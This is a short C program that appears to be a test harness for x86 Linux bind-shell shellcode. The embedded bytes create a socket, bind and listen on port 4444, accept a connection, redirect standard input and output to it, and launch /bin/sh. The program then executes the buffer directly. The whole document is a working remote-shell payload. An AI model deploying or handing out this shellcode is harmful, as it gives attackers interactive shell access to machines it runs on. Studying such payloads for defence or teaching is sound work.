#include<stdio.h>
#include<string.h>
#define PORT "\x11\x5c" //port 4444 in big endian
unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\x43\x6a\x00\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x02\x6a\x00\x66\x68"PORT"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x00\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x6a\x00\x6a\x00\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb0\x3f\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
;
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
